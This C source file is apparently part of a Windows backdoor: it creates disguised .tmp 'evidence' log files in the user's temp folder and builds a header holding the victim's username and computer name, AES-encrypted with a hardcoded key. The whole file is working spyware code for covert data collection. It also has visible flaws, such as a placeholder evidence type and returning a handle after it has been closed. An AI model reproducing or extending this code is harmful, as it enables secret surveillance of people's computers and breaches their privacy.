#include <Windows.h>

#include "log_files.h"
#include "binpatched_vars.h"
#include "aes_alg.h"


HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditionalLen)
{
	LPWSTR pTempPath, pFileName, pFileSuffix, pTempFileSuffix;
	FILETIME uFileTime;
	HANDLE hFile;

#ifdef _DEBUG
	LPWSTR pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] CreateLogFile, uEvidenceType: %08x, pAdditionalHeader: %08x, uAdditionalLen: %08x\n", uEvidenceType, pAdditionalHeader, uAdditionalLen);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	//TODO FIXME: check for filesystem space
	GetSystemTimeAsFileTime(&uFileTime);

	pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
	while(*pTempFileSuffix == L'0')
		pTempFileSuffix++;

	GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
	do
	{
		wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
		hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

		uFileTime.dwLowDateTime++;
		if (uFileTime.dwLowDateTime == 0)
			uFileTime.dwHighDateTime++;
	}
	while (hFile == INVALID_HANDLE_VALUE);
#ifdef _DEBUG
	pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] New log file %s created\n", pFileName);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	free(pTempPath);
	free(pFileSuffix);

	ULONG uFileLen, uOutLen;
	PBYTE pLogFileBuffer = CreateLogHeader(0x41414141, NULL, 0, &uFileLen);
	WriteFile(hFile, pLogFileBuffer, uFileLen, &uOutLen, NULL);
	CloseHandle(hFile);

#ifdef _DEBUG
	pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] Written %d bytes on %s\n", uFileLen, pFileName);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	free(pFileName);
	return hFile;
}

PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditionalDataLen, PULONG uOutLen)
{
	WCHAR wUserName[256];
	WCHAR wHostName[256];
	FILETIME uFileTime;
	LOG_HEADER pLogHeader;
	PLOG_HEADER pFinalLogHeader;

	if (uOutLen)
		*uOutLen = 0;

	memset(wUserName, 0x0, sizeof(wUserName));
	memset(wHostName, 0x0, sizeof(wHostName));
	wUserName[0]=L'-';
	wHostName[0]=L'-';
	GetEnvironmentVariable(L"USERNAME", (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);
	GetEnvironmentVariable(L"COMPUTERNAME", (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);
	GetSystemTimeAsFileTime(&uFileTime);

	pLogHeader.uDeviceIdLen = wcslen(wHostName) * sizeof(WCHAR);
	pLogHeader.uUserIdLen = wcslen(wUserName) * sizeof(WCHAR);
	pLogHeader.uSourceIdLen = 0;
	if (pAdditionalData)
		pLogHeader.uAdditionalData = uAdditionalDataLen;
	else
		pLogHeader.uAdditionalData = 0;
	pLogHeader.uVersion = LOG_VERSION;
	pLogHeader.uHTimestamp = uFileTime.dwHighDateTime;
	pLogHeader.uLTimestamp = uFileTime.dwLowDateTime;
	pLogHeader.uLogType = uEvidenceType;

	// calcola lunghezza paddata
	ULONG uHeaderLen = sizeof(LOG_HEADER) + pLogHeader.uDeviceIdLen + pLogHeader.uUserIdLen + pLogHeader.uSourceIdLen + pLogHeader.uAdditionalData;
	ULONG uPaddedHeaderLen = uHeaderLen + sizeof(ULONG);
	while(uPaddedHeaderLen % BLOCK_LEN)
		uPaddedHeaderLen++;

	pFinalLogHeader = (PLOG_HEADER)malloc(uPaddedHeaderLen);
	PBYTE pTempPtr = (PBYTE)pFinalLogHeader;

	// log size
	*(PULONG)pTempPtr = uHeaderLen;
	pTempPtr += sizeof(ULONG);

	// header
	memcpy(pTempPtr, &pLogHeader, sizeof(LOG_HEADER));
	pTempPtr += sizeof(LOG_HEADER);

	// hostname
	memcpy(pTempPtr, wHostName, pLogHeader.uDeviceIdLen);
	pTempPtr += pLogHeader.uDeviceIdLen;
	
	// username
	memcpy(pTempPtr, wUserName, pLogHeader.uUserIdLen);
	pTempPtr += pLogHeader.uUserIdLen;

	// additional data
	if (pAdditionalData)
		memcpy(pTempPtr, pAdditionalData, uAdditionalDataLen);

	// cifra l'header a parte la prima dword che e' in chiaro
	pTempPtr = (PBYTE)pFinalLogHeader;
	pTempPtr += sizeof(ULONG);

	BYTE pCryptKey[16];
	BYTE pInitVector[BLOCK_LEN];
	aes_context crypt_ctx;

	memset(pInitVector, 0x0, sizeof(pInitVector));
	memcpy(&pCryptKey, ENCRYPTION_KEY, KEY_LEN);
	aes_set_key(&crypt_ctx, pCryptKey, KEY_LEN*8);
	aes_cbc_encrypt(&crypt_ctx, pInitVector, pTempPtr, pTempPtr, uPaddedHeaderLen - sizeof(ULONG));
	if (uOutLen)
		*uOutLen = uPaddedHeaderLen;
	
	return (PBYTE)pFinalLogHeader;
}